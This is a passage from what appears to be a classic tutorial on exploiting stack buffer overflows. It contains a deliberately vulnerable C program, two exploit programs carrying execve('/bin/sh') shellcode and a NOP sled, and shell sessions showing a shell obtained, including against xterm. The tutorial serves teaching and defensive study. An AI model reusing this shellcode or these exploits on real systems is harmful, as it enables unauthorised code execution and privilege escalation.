<a id=__codelineno-0-953 name=__codelineno-0-953 href=#__codelineno-0-953></a>unsigned long get_sp(void) {
<a id=__codelineno-0-954 name=__codelineno-0-954 href=#__codelineno-0-954></a>   __asm__(&quot;movl %esp,%eax&quot;);
<a id=__codelineno-0-955 name=__codelineno-0-955 href=#__codelineno-0-955></a>}
<a id=__codelineno-0-956 name=__codelineno-0-956 href=#__codelineno-0-956></a>void main() {
<a id=__codelineno-0-957 name=__codelineno-0-957 href=#__codelineno-0-957></a>  printf(&quot;0x%x\n&quot;, get_sp());
<a id=__codelineno-0-958 name=__codelineno-0-958 href=#__codelineno-0-958></a>}
<a id=__codelineno-0-959 name=__codelineno-0-959 href=#__codelineno-0-959></a>------------------------------------------------------------------------------
<a id=__codelineno-0-960 name=__codelineno-0-960 href=#__codelineno-0-960></a>
<a id=__codelineno-0-961 name=__codelineno-0-961 href=#__codelineno-0-961></a>------------------------------------------------------------------------------
<a id=__codelineno-0-962 name=__codelineno-0-962 href=#__codelineno-0-962></a>[aleph1]$ ./sp
<a id=__codelineno-0-963 name=__codelineno-0-963 href=#__codelineno-0-963></a>0x8000470
<a id=__codelineno-0-964 name=__codelineno-0-964 href=#__codelineno-0-964></a>[aleph1]$
<a id=__codelineno-0-965 name=__codelineno-0-965 href=#__codelineno-0-965></a>------------------------------------------------------------------------------
<a id=__codelineno-0-966 name=__codelineno-0-966 href=#__codelineno-0-966></a>
<a id=__codelineno-0-967 name=__codelineno-0-967 href=#__codelineno-0-967></a>   Lets assume this is the program we are trying to overflow is:
<a id=__codelineno-0-968 name=__codelineno-0-968 href=#__codelineno-0-968></a>
<a id=__codelineno-0-969 name=__codelineno-0-969 href=#__codelineno-0-969></a>vulnerable.c
<a id=__codelineno-0-970 name=__codelineno-0-970 href=#__codelineno-0-970></a>------------------------------------------------------------------------------
<a id=__codelineno-0-971 name=__codelineno-0-971 href=#__codelineno-0-971></a>void main(int argc, char *argv[]) {
<a id=__codelineno-0-972 name=__codelineno-0-972 href=#__codelineno-0-972></a>  char buffer[512];
<a id=__codelineno-0-973 name=__codelineno-0-973 href=#__codelineno-0-973></a>
<a id=__codelineno-0-974 name=__codelineno-0-974 href=#__codelineno-0-974></a>  if (argc &gt; 1)
<a id=__codelineno-0-975 name=__codelineno-0-975 href=#__codelineno-0-975></a>    strcpy(buffer,argv[1]);
<a id=__codelineno-0-976 name=__codelineno-0-976 href=#__codelineno-0-976></a>}
<a id=__codelineno-0-977 name=__codelineno-0-977 href=#__codelineno-0-977></a>------------------------------------------------------------------------------
<a id=__codelineno-0-978 name=__codelineno-0-978 href=#__codelineno-0-978></a>
<a id=__codelineno-0-979 name=__codelineno-0-979 href=#__codelineno-0-979></a>   We can create a program that takes as a parameter a buffer size, and an
<a id=__codelineno-0-980 name=__codelineno-0-980 href=#__codelineno-0-980></a>offset from its own stack pointer (where we believe the buffer we want to
<a id=__codelineno-0-981 name=__codelineno-0-981 href=#__codelineno-0-981></a>overflow may live).  We&#39;ll put the overflow string in an environment variable
<a id=__codelineno-0-982 name=__codelineno-0-982 href=#__codelineno-0-982></a>so it is easy to manipulate:
<a id=__codelineno-0-983 name=__codelineno-0-983 href=#__codelineno-0-983></a>
<a id=__codelineno-0-984 name=__codelineno-0-984 href=#__codelineno-0-984></a>exploit2.c
<a id=__codelineno-0-985 name=__codelineno-0-985 href=#__codelineno-0-985></a>------------------------------------------------------------------------------
<a id=__codelineno-0-986 name=__codelineno-0-986 href=#__codelineno-0-986></a>#include &lt;stdlib.h&gt;
<a id=__codelineno-0-987 name=__codelineno-0-987 href=#__codelineno-0-987></a>
<a id=__codelineno-0-988 name=__codelineno-0-988 href=#__codelineno-0-988></a>#define DEFAULT_OFFSET                    0
<a id=__codelineno-0-989 name=__codelineno-0-989 href=#__codelineno-0-989></a>#define DEFAULT_BUFFER_SIZE             512
<a id=__codelineno-0-990 name=__codelineno-0-990 href=#__codelineno-0-990></a>
<a id=__codelineno-0-991 name=__codelineno-0-991 href=#__codelineno-0-991></a>char shellcode[] =
<a id=__codelineno-0-992 name=__codelineno-0-992 href=#__codelineno-0-992></a>  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
<a id=__codelineno-0-993 name=__codelineno-0-993 href=#__codelineno-0-993></a>  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
<a id=__codelineno-0-994 name=__codelineno-0-994 href=#__codelineno-0-994></a>  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;
<a id=__codelineno-0-995 name=__codelineno-0-995 href=#__codelineno-0-995></a>
<a id=__codelineno-0-996 name=__codelineno-0-996 href=#__codelineno-0-996></a>unsigned long get_sp(void) {
<a id=__codelineno-0-997 name=__codelineno-0-997 href=#__codelineno-0-997></a>   __asm__(&quot;movl %esp,%eax&quot;);
<a id=__codelineno-0-998 name=__codelineno-0-998 href=#__codelineno-0-998></a>}
<a id=__codelineno-0-999 name=__codelineno-0-999 href=#__codelineno-0-999></a>
<a id=__codelineno-0-1000 name=__codelineno-0-1000 href=#__codelineno-0-1000></a>void main(int argc, char *argv[]) {
<a id=__codelineno-0-1001 name=__codelineno-0-1001 href=#__codelineno-0-1001></a>  char *buff, *ptr;
<a id=__codelineno-0-1002 name=__codelineno-0-1002 href=#__codelineno-0-1002></a>  long *addr_ptr, addr;
<a id=__codelineno-0-1003 name=__codelineno-0-1003 href=#__codelineno-0-1003></a>  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
<a id=__codelineno-0-1004 name=__codelineno-0-1004 href=#__codelineno-0-1004></a>  int i;
<a id=__codelineno-0-1005 name=__codelineno-0-1005 href=#__codelineno-0-1005></a>
<a id=__codelineno-0-1006 name=__codelineno-0-1006 href=#__codelineno-0-1006></a>  if (argc &gt; 1) bsize  = atoi(argv[1]);
<a id=__codelineno-0-1007 name=__codelineno-0-1007 href=#__codelineno-0-1007></a>  if (argc &gt; 2) offset = atoi(argv[2]);
<a id=__codelineno-0-1008 name=__codelineno-0-1008 href=#__codelineno-0-1008></a>
<a id=__codelineno-0-1009 name=__codelineno-0-1009 href=#__codelineno-0-1009></a>  if (!(buff = malloc(bsize))) {
<a id=__codelineno-0-1010 name=__codelineno-0-1010 href=#__codelineno-0-1010></a>    printf(&quot;Can&#39;t allocate memory.\n&quot;);
<a id=__codelineno-0-1011 name=__codelineno-0-1011 href=#__codelineno-0-1011></a>    exit(0);
<a id=__codelineno-0-1012 name=__codelineno-0-1012 href=#__codelineno-0-1012></a>  }
<a id=__codelineno-0-1013 name=__codelineno-0-1013 href=#__codelineno-0-1013></a>
<a id=__codelineno-0-1014 name=__codelineno-0-1014 href=#__codelineno-0-1014></a>  addr = get_sp() - offset;
<a id=__codelineno-0-1015 name=__codelineno-0-1015 href=#__codelineno-0-1015></a>  printf(&quot;Using address: 0x%x\n&quot;, addr);
<a id=__codelineno-0-1016 name=__codelineno-0-1016 href=#__codelineno-0-1016></a>
<a id=__codelineno-0-1017 name=__codelineno-0-1017 href=#__codelineno-0-1017></a>  ptr = buff;
<a id=__codelineno-0-1018 name=__codelineno-0-1018 href=#__codelineno-0-1018></a>  addr_ptr = (long *) ptr;
<a id=__codelineno-0-1019 name=__codelineno-0-1019 href=#__codelineno-0-1019></a>  for (i = 0; i &lt; bsize; i+=4)
<a id=__codelineno-0-1020 name=__codelineno-0-1020 href=#__codelineno-0-1020></a>    *(addr_ptr++) = addr;
<a id=__codelineno-0-1021 name=__codelineno-0-1021 href=#__codelineno-0-1021></a>
<a id=__codelineno-0-1022 name=__codelineno-0-1022 href=#__codelineno-0-1022></a>  ptr += 4;
<a id=__codelineno-0-1023 name=__codelineno-0-1023 href=#__codelineno-0-1023></a>  for (i = 0; i &lt; strlen(shellcode); i++)
<a id=__codelineno-0-1024 name=__codelineno-0-1024 href=#__codelineno-0-1024></a>    *(ptr++) = shellcode[i];
<a id=__codelineno-0-1025 name=__codelineno-0-1025 href=#__codelineno-0-1025></a>
<a id=__codelineno-0-1026 name=__codelineno-0-1026 href=#__codelineno-0-1026></a>  buff[bsize - 1] = &#39;\0&#39;;
<a id=__codelineno-0-1027 name=__codelineno-0-1027 href=#__codelineno-0-1027></a>
<a id=__codelineno-0-1028 name=__codelineno-0-1028 href=#__codelineno-0-1028></a>  memcpy(buff,&quot;EGG=&quot;,4);
<a id=__codelineno-0-1029 name=__codelineno-0-1029 href=#__codelineno-0-1029></a>  putenv(buff);
<a id=__codelineno-0-1030 name=__codelineno-0-1030 href=#__codelineno-0-1030></a>  system(&quot;/bin/bash&quot;);
<a id=__codelineno-0-1031 name=__codelineno-0-1031 href=#__codelineno-0-1031></a>}
<a id=__codelineno-0-1032 name=__codelineno-0-1032 href=#__codelineno-0-1032></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1033 name=__codelineno-0-1033 href=#__codelineno-0-1033></a>
<a id=__codelineno-0-1034 name=__codelineno-0-1034 href=#__codelineno-0-1034></a>   Now we can try to guess what the buffer and offset should be:
<a id=__codelineno-0-1035 name=__codelineno-0-1035 href=#__codelineno-0-1035></a>
<a id=__codelineno-0-1036 name=__codelineno-0-1036 href=#__codelineno-0-1036></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1037 name=__codelineno-0-1037 href=#__codelineno-0-1037></a>[aleph1]$ ./exploit2 500
<a id=__codelineno-0-1038 name=__codelineno-0-1038 href=#__codelineno-0-1038></a>Using address: 0xbffffdb4
<a id=__codelineno-0-1039 name=__codelineno-0-1039 href=#__codelineno-0-1039></a>[aleph1]$ ./vulnerable $EGG
<a id=__codelineno-0-1040 name=__codelineno-0-1040 href=#__codelineno-0-1040></a>[aleph1]$ exit
<a id=__codelineno-0-1041 name=__codelineno-0-1041 href=#__codelineno-0-1041></a>[aleph1]$ ./exploit2 600
<a id=__codelineno-0-1042 name=__codelineno-0-1042 href=#__codelineno-0-1042></a>Using address: 0xbffffdb4
<a id=__codelineno-0-1043 name=__codelineno-0-1043 href=#__codelineno-0-1043></a>[aleph1]$ ./vulnerable $EGG
<a id=__codelineno-0-1044 name=__codelineno-0-1044 href=#__codelineno-0-1044></a>Illegal instruction
<a id=__codelineno-0-1045 name=__codelineno-0-1045 href=#__codelineno-0-1045></a>[aleph1]$ exit
<a id=__codelineno-0-1046 name=__codelineno-0-1046 href=#__codelineno-0-1046></a>[aleph1]$ ./exploit2 600 100
<a id=__codelineno-0-1047 name=__codelineno-0-1047 href=#__codelineno-0-1047></a>Using address: 0xbffffd4c
<a id=__codelineno-0-1048 name=__codelineno-0-1048 href=#__codelineno-0-1048></a>[aleph1]$ ./vulnerable $EGG
<a id=__codelineno-0-1049 name=__codelineno-0-1049 href=#__codelineno-0-1049></a>Segmentation fault
<a id=__codelineno-0-1050 name=__codelineno-0-1050 href=#__codelineno-0-1050></a>[aleph1]$ exit
<a id=__codelineno-0-1051 name=__codelineno-0-1051 href=#__codelineno-0-1051></a>[aleph1]$ ./exploit2 600 200
<a id=__codelineno-0-1052 name=__codelineno-0-1052 href=#__codelineno-0-1052></a>Using address: 0xbffffce8
<a id=__codelineno-0-1053 name=__codelineno-0-1053 href=#__codelineno-0-1053></a>[aleph1]$ ./vulnerable $EGG
<a id=__codelineno-0-1054 name=__codelineno-0-1054 href=#__codelineno-0-1054></a>Segmentation fault
<a id=__codelineno-0-1055 name=__codelineno-0-1055 href=#__codelineno-0-1055></a>[aleph1]$ exit
<a id=__codelineno-0-1056 name=__codelineno-0-1056 href=#__codelineno-0-1056></a>.
<a id=__codelineno-0-1057 name=__codelineno-0-1057 href=#__codelineno-0-1057></a>.
<a id=__codelineno-0-1058 name=__codelineno-0-1058 href=#__codelineno-0-1058></a>.
<a id=__codelineno-0-1059 name=__codelineno-0-1059 href=#__codelineno-0-1059></a>[aleph1]$ ./exploit2 600 1564
<a id=__codelineno-0-1060 name=__codelineno-0-1060 href=#__codelineno-0-1060></a>Using address: 0xbffff794
<a id=__codelineno-0-1061 name=__codelineno-0-1061 href=#__codelineno-0-1061></a>[aleph1]$ ./vulnerable $EGG
<a id=__codelineno-0-1062 name=__codelineno-0-1062 href=#__codelineno-0-1062></a>$
<a id=__codelineno-0-1063 name=__codelineno-0-1063 href=#__codelineno-0-1063></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1064 name=__codelineno-0-1064 href=#__codelineno-0-1064></a>
<a id=__codelineno-0-1065 name=__codelineno-0-1065 href=#__codelineno-0-1065></a>   As we can see this is not an efficient process.  Trying to guess the
<a id=__codelineno-0-1066 name=__codelineno-0-1066 href=#__codelineno-0-1066></a>offset even while knowing where the beginning of the stack lives is nearly
<a id=__codelineno-0-1067 name=__codelineno-0-1067 href=#__codelineno-0-1067></a>impossible.  We would need at best a hundred tries, and at worst a couple of
<a id=__codelineno-0-1068 name=__codelineno-0-1068 href=#__codelineno-0-1068></a>thousand.  The problem is we need to guess *exactly* where the address of our 
<a id=__codelineno-0-1069 name=__codelineno-0-1069 href=#__codelineno-0-1069></a>code will start.  If we are off by one byte more or less we will just get a
<a id=__codelineno-0-1070 name=__codelineno-0-1070 href=#__codelineno-0-1070></a>segmentation violation or a invalid instruction.  One way to increase our
<a id=__codelineno-0-1071 name=__codelineno-0-1071 href=#__codelineno-0-1071></a>chances is to pad the front of our overflow buffer with NOP instructions.
<a id=__codelineno-0-1072 name=__codelineno-0-1072 href=#__codelineno-0-1072></a>Almost all processors have a NOP instruction that performs a null operation.
<a id=__codelineno-0-1073 name=__codelineno-0-1073 href=#__codelineno-0-1073></a>It is usually used to delay execution for purposes of timing.  We will take
<a id=__codelineno-0-1074 name=__codelineno-0-1074 href=#__codelineno-0-1074></a>advantage of it and fill half of our overflow buffer with them.  We will place
<a id=__codelineno-0-1075 name=__codelineno-0-1075 href=#__codelineno-0-1075></a>our shellcode at the center, and then follow it with the return addresses. If
<a id=__codelineno-0-1076 name=__codelineno-0-1076 href=#__codelineno-0-1076></a>we are lucky and the return address points anywhere in the string of NOPs,
<a id=__codelineno-0-1077 name=__codelineno-0-1077 href=#__codelineno-0-1077></a>they will just get executed until they reach our code.  In the Intel
<a id=__codelineno-0-1078 name=__codelineno-0-1078 href=#__codelineno-0-1078></a>architecture the NOP instruction is one byte long and it translates to 0x90
<a id=__codelineno-0-1079 name=__codelineno-0-1079 href=#__codelineno-0-1079></a>in machine code.  Assuming the stack starts at address 0xFF, that S stands for
<a id=__codelineno-0-1080 name=__codelineno-0-1080 href=#__codelineno-0-1080></a>shell code, and that N stands for a NOP instruction the new stack would look
<a id=__codelineno-0-1081 name=__codelineno-0-1081 href=#__codelineno-0-1081></a>like this:
<a id=__codelineno-0-1082 name=__codelineno-0-1082 href=#__codelineno-0-1082></a>
<a id=__codelineno-0-1083 name=__codelineno-0-1083 href=#__codelineno-0-1083></a>bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
<a id=__codelineno-0-1084 name=__codelineno-0-1084 href=#__codelineno-0-1084></a>memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
<a id=__codelineno-0-1085 name=__codelineno-0-1085 href=#__codelineno-0-1085></a>           buffer                sfp   ret   a     b     c
<a id=__codelineno-0-1086 name=__codelineno-0-1086 href=#__codelineno-0-1086></a>
<a id=__codelineno-0-1087 name=__codelineno-0-1087 href=#__codelineno-0-1087></a>&lt;------   [NNNNNNNNNNNSSSSSSSSS][0xDE][0xDE][0xDE][0xDE][0xDE]
<a id=__codelineno-0-1088 name=__codelineno-0-1088 href=#__codelineno-0-1088></a>                 ^                     |
<a id=__codelineno-0-1089 name=__codelineno-0-1089 href=#__codelineno-0-1089></a>                 |_____________________|
<a id=__codelineno-0-1090 name=__codelineno-0-1090 href=#__codelineno-0-1090></a>top of                                                            bottom of
<a id=__codelineno-0-1091 name=__codelineno-0-1091 href=#__codelineno-0-1091></a>stack                                                                 stack
<a id=__codelineno-0-1092 name=__codelineno-0-1092 href=#__codelineno-0-1092></a>
<a id=__codelineno-0-1093 name=__codelineno-0-1093 href=#__codelineno-0-1093></a>   The new exploits is then:
<a id=__codelineno-0-1094 name=__codelineno-0-1094 href=#__codelineno-0-1094></a>
<a id=__codelineno-0-1095 name=__codelineno-0-1095 href=#__codelineno-0-1095></a>exploit3.c
<a id=__codelineno-0-1096 name=__codelineno-0-1096 href=#__codelineno-0-1096></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1097 name=__codelineno-0-1097 href=#__codelineno-0-1097></a>#include &lt;stdlib.h&gt;
<a id=__codelineno-0-1098 name=__codelineno-0-1098 href=#__codelineno-0-1098></a>
<a id=__codelineno-0-1099 name=__codelineno-0-1099 href=#__codelineno-0-1099></a>#define DEFAULT_OFFSET                    0
<a id=__codelineno-0-1100 name=__codelineno-0-1100 href=#__codelineno-0-1100></a>#define DEFAULT_BUFFER_SIZE             512
<a id=__codelineno-0-1101 name=__codelineno-0-1101 href=#__codelineno-0-1101></a>#define NOP                            0x90
<a id=__codelineno-0-1102 name=__codelineno-0-1102 href=#__codelineno-0-1102></a>
<a id=__codelineno-0-1103 name=__codelineno-0-1103 href=#__codelineno-0-1103></a>char shellcode[] =
<a id=__codelineno-0-1104 name=__codelineno-0-1104 href=#__codelineno-0-1104></a>  &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot;
<a id=__codelineno-0-1105 name=__codelineno-0-1105 href=#__codelineno-0-1105></a>  &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot;
<a id=__codelineno-0-1106 name=__codelineno-0-1106 href=#__codelineno-0-1106></a>  &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;;
<a id=__codelineno-0-1107 name=__codelineno-0-1107 href=#__codelineno-0-1107></a>
<a id=__codelineno-0-1108 name=__codelineno-0-1108 href=#__codelineno-0-1108></a>unsigned long get_sp(void) {
<a id=__codelineno-0-1109 name=__codelineno-0-1109 href=#__codelineno-0-1109></a>   __asm__(&quot;movl %esp,%eax&quot;);
<a id=__codelineno-0-1110 name=__codelineno-0-1110 href=#__codelineno-0-1110></a>}
<a id=__codelineno-0-1111 name=__codelineno-0-1111 href=#__codelineno-0-1111></a>
<a id=__codelineno-0-1112 name=__codelineno-0-1112 href=#__codelineno-0-1112></a>void main(int argc, char *argv[]) {
<a id=__codelineno-0-1113 name=__codelineno-0-1113 href=#__codelineno-0-1113></a>  char *buff, *ptr;
<a id=__codelineno-0-1114 name=__codelineno-0-1114 href=#__codelineno-0-1114></a>  long *addr_ptr, addr;
<a id=__codelineno-0-1115 name=__codelineno-0-1115 href=#__codelineno-0-1115></a>  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
<a id=__codelineno-0-1116 name=__codelineno-0-1116 href=#__codelineno-0-1116></a>  int i;
<a id=__codelineno-0-1117 name=__codelineno-0-1117 href=#__codelineno-0-1117></a>
<a id=__codelineno-0-1118 name=__codelineno-0-1118 href=#__codelineno-0-1118></a>  if (argc &gt; 1) bsize  = atoi(argv[1]);
<a id=__codelineno-0-1119 name=__codelineno-0-1119 href=#__codelineno-0-1119></a>  if (argc &gt; 2) offset = atoi(argv[2]);
<a id=__codelineno-0-1120 name=__codelineno-0-1120 href=#__codelineno-0-1120></a>
<a id=__codelineno-0-1121 name=__codelineno-0-1121 href=#__codelineno-0-1121></a>  if (!(buff = malloc(bsize))) {
<a id=__codelineno-0-1122 name=__codelineno-0-1122 href=#__codelineno-0-1122></a>    printf(&quot;Can&#39;t allocate memory.\n&quot;);
<a id=__codelineno-0-1123 name=__codelineno-0-1123 href=#__codelineno-0-1123></a>    exit(0);
<a id=__codelineno-0-1124 name=__codelineno-0-1124 href=#__codelineno-0-1124></a>  }
<a id=__codelineno-0-1125 name=__codelineno-0-1125 href=#__codelineno-0-1125></a>
<a id=__codelineno-0-1126 name=__codelineno-0-1126 href=#__codelineno-0-1126></a>  addr = get_sp() - offset;
<a id=__codelineno-0-1127 name=__codelineno-0-1127 href=#__codelineno-0-1127></a>  printf(&quot;Using address: 0x%x\n&quot;, addr);
<a id=__codelineno-0-1128 name=__codelineno-0-1128 href=#__codelineno-0-1128></a>
<a id=__codelineno-0-1129 name=__codelineno-0-1129 href=#__codelineno-0-1129></a>  ptr = buff;
<a id=__codelineno-0-1130 name=__codelineno-0-1130 href=#__codelineno-0-1130></a>  addr_ptr = (long *) ptr;
<a id=__codelineno-0-1131 name=__codelineno-0-1131 href=#__codelineno-0-1131></a>  for (i = 0; i &lt; bsize; i+=4)
<a id=__codelineno-0-1132 name=__codelineno-0-1132 href=#__codelineno-0-1132></a>    *(addr_ptr++) = addr;
<a id=__codelineno-0-1133 name=__codelineno-0-1133 href=#__codelineno-0-1133></a>
<a id=__codelineno-0-1134 name=__codelineno-0-1134 href=#__codelineno-0-1134></a>  for (i = 0; i &lt; bsize/2; i++)
<a id=__codelineno-0-1135 name=__codelineno-0-1135 href=#__codelineno-0-1135></a>    buff[i] = NOP;
<a id=__codelineno-0-1136 name=__codelineno-0-1136 href=#__codelineno-0-1136></a>
<a id=__codelineno-0-1137 name=__codelineno-0-1137 href=#__codelineno-0-1137></a>  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
<a id=__codelineno-0-1138 name=__codelineno-0-1138 href=#__codelineno-0-1138></a>  for (i = 0; i &lt; strlen(shellcode); i++)
<a id=__codelineno-0-1139 name=__codelineno-0-1139 href=#__codelineno-0-1139></a>    *(ptr++) = shellcode[i];
<a id=__codelineno-0-1140 name=__codelineno-0-1140 href=#__codelineno-0-1140></a>
<a id=__codelineno-0-1141 name=__codelineno-0-1141 href=#__codelineno-0-1141></a>  buff[bsize - 1] = &#39;\0&#39;;
<a id=__codelineno-0-1142 name=__codelineno-0-1142 href=#__codelineno-0-1142></a>
<a id=__codelineno-0-1143 name=__codelineno-0-1143 href=#__codelineno-0-1143></a>  memcpy(buff,&quot;EGG=&quot;,4);
<a id=__codelineno-0-1144 name=__codelineno-0-1144 href=#__codelineno-0-1144></a>  putenv(buff);
<a id=__codelineno-0-1145 name=__codelineno-0-1145 href=#__codelineno-0-1145></a>  system(&quot;/bin/bash&quot;);
<a id=__codelineno-0-1146 name=__codelineno-0-1146 href=#__codelineno-0-1146></a>}
<a id=__codelineno-0-1147 name=__codelineno-0-1147 href=#__codelineno-0-1147></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1148 name=__codelineno-0-1148 href=#__codelineno-0-1148></a>
<a id=__codelineno-0-1149 name=__codelineno-0-1149 href=#__codelineno-0-1149></a>   A good selection for our buffer size is about 100 bytes more than the size
<a id=__codelineno-0-1150 name=__codelineno-0-1150 href=#__codelineno-0-1150></a>of the buffer we are trying to overflow.  This will place our code at the end
<a id=__codelineno-0-1151 name=__codelineno-0-1151 href=#__codelineno-0-1151></a>of the buffer we are trying to overflow, giving a lot of space for the NOPs,
<a id=__codelineno-0-1152 name=__codelineno-0-1152 href=#__codelineno-0-1152></a>but still overwriting the return address with the address we guessed.  The
<a id=__codelineno-0-1153 name=__codelineno-0-1153 href=#__codelineno-0-1153></a>buffer we are trying to overflow is 512 bytes long, so we&#39;ll use 612.  Let&#39;s
<a id=__codelineno-0-1154 name=__codelineno-0-1154 href=#__codelineno-0-1154></a>try to overflow our test program with our new exploit:
<a id=__codelineno-0-1155 name=__codelineno-0-1155 href=#__codelineno-0-1155></a>
<a id=__codelineno-0-1156 name=__codelineno-0-1156 href=#__codelineno-0-1156></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1157 name=__codelineno-0-1157 href=#__codelineno-0-1157></a>[aleph1]$ ./exploit3 612
<a id=__codelineno-0-1158 name=__codelineno-0-1158 href=#__codelineno-0-1158></a>Using address: 0xbffffdb4
<a id=__codelineno-0-1159 name=__codelineno-0-1159 href=#__codelineno-0-1159></a>[aleph1]$ ./vulnerable $EGG
<a id=__codelineno-0-1160 name=__codelineno-0-1160 href=#__codelineno-0-1160></a>$
<a id=__codelineno-0-1161 name=__codelineno-0-1161 href=#__codelineno-0-1161></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1162 name=__codelineno-0-1162 href=#__codelineno-0-1162></a>
<a id=__codelineno-0-1163 name=__codelineno-0-1163 href=#__codelineno-0-1163></a>   Whoa!  First try!  This change has improved our chances a hundredfold. 
<a id=__codelineno-0-1164 name=__codelineno-0-1164 href=#__codelineno-0-1164></a>Let&#39;s try it now on a real case of a buffer overflow.  We&#39;ll use for our
<a id=__codelineno-0-1165 name=__codelineno-0-1165 href=#__codelineno-0-1165></a>demonstration the buffer overflow on the Xt library.  For our example, we&#39;ll 
<a id=__codelineno-0-1166 name=__codelineno-0-1166 href=#__codelineno-0-1166></a>use xterm (all programs linked with the Xt library are vulnerable). You must
<a id=__codelineno-0-1167 name=__codelineno-0-1167 href=#__codelineno-0-1167></a>be running an X server and allow connections to it from the localhost.  Set
<a id=__codelineno-0-1168 name=__codelineno-0-1168 href=#__codelineno-0-1168></a>your DISPLAY variable accordingly.
<a id=__codelineno-0-1169 name=__codelineno-0-1169 href=#__codelineno-0-1169></a>
<a id=__codelineno-0-1170 name=__codelineno-0-1170 href=#__codelineno-0-1170></a>------------------------------------------------------------------------------
<a id=__codelineno-0-1171 name=__codelineno-0-1171 href=#__codelineno-0-1171></a>[aleph1]$ export DISPLAY=:0.0
<a id=__codelineno-0-1172 name=__codelineno-0-1172 href=#__codelineno-0-1172></a>[aleph1]$ ./exploit3 1124
<a id=__codelineno-0-1173 name=__codelineno-0-1173 href=#__codelineno-0-1173></a>Using address: 0xbffffdb4
<a id=__codelineno-0-1174 name=__codelineno-0-1174 href=#__codelineno-0-1174></a>[aleph1]$ /usr/X11R6/bin/xterm -fg $EGG
<a id=__codelineno-0-1175 name=__codelineno-0-1175 href=#__codelineno-0-1175></a>Warning: Color name &quot;ë^1¤FF
<a id=__codelineno-0-1176 name=__codelineno-0-1176 href=#__codelineno-0-1176></a>                           °
<a id=__codelineno-0-1177 name=__codelineno-0-1177 href=#__codelineno-0-1177></a>                            óV
<a id=__codelineno-0-1178 name=__codelineno-0-1178 href=#__codelineno-0-1178></a>
<a id=__codelineno-0-1179 name=__codelineno-0-1179 href=#__codelineno-0-1179></a>¤1¤Ø@¤èÜÿÿÿ/bin/sh¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤
<a id=__codelineno-0-1180 name=__codelineno-0-1180 href=#__codelineno-0-1180></a>
<a id=__codelineno-0-1181 name=__codelineno-0-1181 href=#__codelineno-0-1181></a>
<a id=__codelineno-0-1182 name=__codelineno-0-1182 href=#__codelineno-0-1182></a>
<a id=__codelineno-0-1183 name=__codelineno-0-1183 href=#__codelineno-0-1183></a>
<a id=__codelineno-0-1184 name=__codelineno-0-1184 href=#__codelineno-0-1184></a>
<a id=__codelineno-0-1185 name=__codelineno-0-1185 href=#__codelineno-0-1185></a>
<a id=__codelineno-0-1186 name=__codelineno-0-1186 href=#__codelineno-0-1186></a>
<a id=__codelineno-0-1187 name=__codelineno-0-1187 href=#__codelineno-0-1187></a>
<a id=__codelineno-0-1188 name=__codelineno-0-1188 href=#__codelineno-0-1188></a>ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤¤ÿ¿¤
